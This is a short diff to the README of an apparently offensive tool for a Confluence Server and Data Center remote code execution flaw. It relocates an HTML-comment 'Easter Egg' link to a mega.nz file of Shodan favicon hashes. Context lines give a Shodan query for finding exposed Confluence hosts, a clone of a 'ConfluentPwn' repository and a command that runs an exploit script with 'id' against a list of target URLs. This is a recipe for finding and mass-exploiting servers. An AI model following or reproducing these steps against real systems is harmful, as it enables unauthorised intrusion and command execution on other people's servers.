@@ -4,6 +4,10 @@ Confluence Server and Data Center RCE
 ```
 http.favicon.hash:-305179312
 ```
+<!-- Here is an Easter Egg for inquiring minds
+shodan-favicon-hashes - https://mega.nz/file/ctdH3LAB#lnE0GUkfCacwA18wR1VQI6TxIJ4OKM_6YKQdpHY4GN0
+-->
+
 - Scan hosts for vulnerability
 ```
 git clone https://github.com/redhuntlabs/ConfluentPwn; cd ConfluentPwn
@@ -50,6 +54,3 @@ Exploit multi-targets
 ```
 python3 exploit2.py -f urls.txt -c id
 ```
-<!-- Here is an Easter Egg for inquiring minds
-shodan-favicon-hashes - https://mega.nz/file/ctdH3LAB#lnE0GUkfCacwA18wR1VQI6TxIJ4OKM_6YKQdpHY4GN0
--->
